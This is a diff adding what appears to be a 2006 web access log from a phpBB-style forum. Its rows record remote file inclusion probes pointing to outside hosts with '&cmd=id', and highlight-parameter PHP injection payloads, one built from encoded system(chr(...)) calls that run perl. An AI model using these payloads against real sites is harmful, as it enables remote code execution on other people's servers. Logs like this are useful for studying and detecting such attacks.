@@ -1,0 +1,14 @@
+1|||1156000217|||null|||null|||null|||null|||null
+0|||1157237236|||/viewtopic.php?t=8&highlight=%2527.$poster=$dbuser.%2527||||||Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6|||193.93.96.179|||
+0|||1157284535|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||82.55.116.244|||
+0|||1157407405|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.16.102.231|||
+0|||1157407409|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.16.102.231|||
+0|||1157629888|||/search.php?search_author=http://yem.wpc.or.kr/event_popup/2000603Japan/0603Japan.files/slide0013_image112.jpg?&cmd=id||||||Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)|||201.43.54.211|||
+0|||1157653163|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.16.102.231|||
+0|||1157653166|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.16.102.231|||
+0|||1158150259|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.10.105.244|||
+0|||1158150282|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.10.105.244|||
+0|||1158234147|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.16.102.228|||
+0|||1158234149|||/index.php?c=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||87.16.102.228|||
+0|||1158286993|||/viewtopic.php?p=http://busca.uol.com.br/uol/index.html?&cmd=id|||||||||201.9.100.134|||
+0|||1158611804|||/viewtopic.php?p=826&highlight=%2527%252Esystem(chr(112)%252Echr(101)%252Echr(114)%252Echr(108)%252Echr(32)%252Echr(45)%252Echr(101)%252Echr(32)%252Echr(34)%252Echr(112)%252Echr(114)%252Echr(105)%252Echr(110)%252Echr(116)%252Echr(32)%252Echr(113)%252Echr(40)%252Echr(106)%252Echr(83)%252Echr(86)%252Echr(111)%252Echr(119)%252Echr(77)%252Echr(115)%252Echr(100)%252Echr(41)%252Echr(34))%252E%2527||||||Mozilla/4.0|||216.55.136.39|||
